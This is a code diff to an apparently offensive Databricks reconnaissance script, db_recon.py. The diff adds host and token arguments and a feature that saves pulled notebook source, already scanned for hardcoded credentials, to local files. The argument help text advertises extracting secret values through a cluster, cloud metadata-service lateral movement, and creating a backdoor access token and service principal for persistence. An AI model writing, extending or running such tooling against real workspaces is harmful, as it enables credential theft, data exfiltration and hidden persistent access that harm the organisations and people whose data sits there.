@@ -10,7 +10,7 @@ Usage:
     export DATABRICKS_HOST=https://<workspace>.azuredatabricks.net
     export DATABRICKS_TOKEN=dapi...
 
-    python db_recon.py [--persist] [--cloud aws|azure]
+    python db_recon.py --host https://<workspace>.azuredatabricks.net --token dapi... [--enum] [--secrets] [--cloud aws|azure] [--persist]
 """
 
 import re
@@ -350,7 +350,7 @@ def notebooks_list(w: WorkspaceClient, days: int | None):
     return nbs
 
 
-def notebooks_pull(w: WorkspaceClient, target: str, days: int | None):
+def notebooks_pull(w: WorkspaceClient, target: str, days: int | None, save_dir: str | None = None):
     """Scan notebook source for hardcoded creds. target='*' or a specific path."""
     import base64
     banner(f"NOTEBOOKS — pull {'*' if target == '*' else target}"
@@ -371,6 +371,10 @@ def notebooks_pull(w: WorkspaceClient, target: str, days: int | None):
                 warn(f"Could not find notebook at {target}: {e}")
                 return []
 
+    if save_dir:
+        os.makedirs(save_dir, exist_ok=True)
+        info(f"Saving notebooks to {save_dir}/")
+
     info(f"Scanning {len(nbs)} notebook(s) for credential patterns...")
     hits = []
     for nb in nbs:
@@ -379,6 +383,15 @@ def notebooks_pull(w: WorkspaceClient, target: str, days: int | None):
             if not export.content:
                 continue
             source = base64.b64decode(export.content).decode("utf-8", errors="replace")
+
+            if save_dir:
+                # mirror the workspace path under save_dir, swap / for _ to flatten
+                safe_name = nb.path.lstrip("/").replace("/", "__") + ".py"
+                out_path = os.path.join(save_dir, safe_name)
+                with open(out_path, "w", encoding="utf-8") as f:
+                    f.write(source)
+                info(f"Saved {nb.path} → {out_path}")
+
             matched_lines = [
                 (i + 1, line.strip())
                 for i, line in enumerate(source.splitlines())
@@ -423,12 +436,15 @@ Examples:
   python db_recon.py --enum --secrets --cloud aws --persist
         """,
     )
+    parser.add_argument("--host",            metavar="URL",        help="Workspace URL (overrides DATABRICKS_HOST)")
+    parser.add_argument("--token",           metavar="DAPI...",    help="PAT token (overrides DATABRICKS_TOKEN)")
     parser.add_argument("--enum",            action="store_true", help="Identity, tokens, users, clusters, PII schema")
     parser.add_argument("--secrets",         action="store_true", help="Secret scopes + extract values via cluster")
     parser.add_argument("--cloud",           choices=["aws", "azure"], default=None, help="IMDS lateral movement via cluster")
     parser.add_argument("--persist",         action="store_true", help="Create backdoor PAT token + service principal")
     parser.add_argument("--notebooks-list",  action="store_true", help="List notebooks (path + modified date)")
     parser.add_argument("--notebooks-pull",  metavar="PATH|*",    help="Scan notebook(s) for creds; * for all")
+    parser.add_argument("--save-dir",        metavar="DIR",        help="Save pulled notebook source to this directory")
     parser.add_argument("--days",            type=int, default=None, metavar="N", help="Only notebooks modified in last N days")
     args = parser.parse_args()
 
@@ -437,7 +453,10 @@ Examples:
         parser.print_help()
         return
 
-    w = WorkspaceClient()  # reads DATABRICKS_HOST + DATABRICKS_TOKEN from env
+    w = WorkspaceClient(
+        host=args.host or os.environ.get("DATABRICKS_HOST"),
+        token=args.token or os.environ.get("DATABRICKS_TOKEN"),
+    )
 
     # cluster is only resolved when a module needs it
     _cluster_id = None
@@ -463,7 +482,7 @@ Examples:
         notebooks_list(w, args.days)
 
     if args.notebooks_pull:
-        nb_hits = notebooks_pull(w, args.notebooks_pull, args.days)
+        nb_hits = notebooks_pull(w, args.notebooks_pull, args.days, args.save_dir)
         summary["notebooks_with_creds"] = len(nb_hits)
 
     secret_hits = []
